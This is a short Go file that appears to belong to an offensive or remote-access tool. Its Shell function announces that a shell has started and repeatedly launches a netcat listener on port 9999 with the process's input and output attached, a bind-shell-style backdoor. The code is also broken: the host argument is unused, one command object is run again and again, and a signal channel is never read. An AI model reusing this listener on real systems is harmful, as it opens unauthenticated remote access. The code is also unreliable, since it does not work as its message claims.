package helpers

import (
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func Shell(host string) {
	os.Stdout.Write([]byte("Shell Successfully Started!\n"))
	cmd := exec.Command("/usr/bin/nc", "-l", "9999")
	for i := 1; i > 0; i++ {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		c := make(chan os.Signal)
		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
		cmd.Run()
	}

}
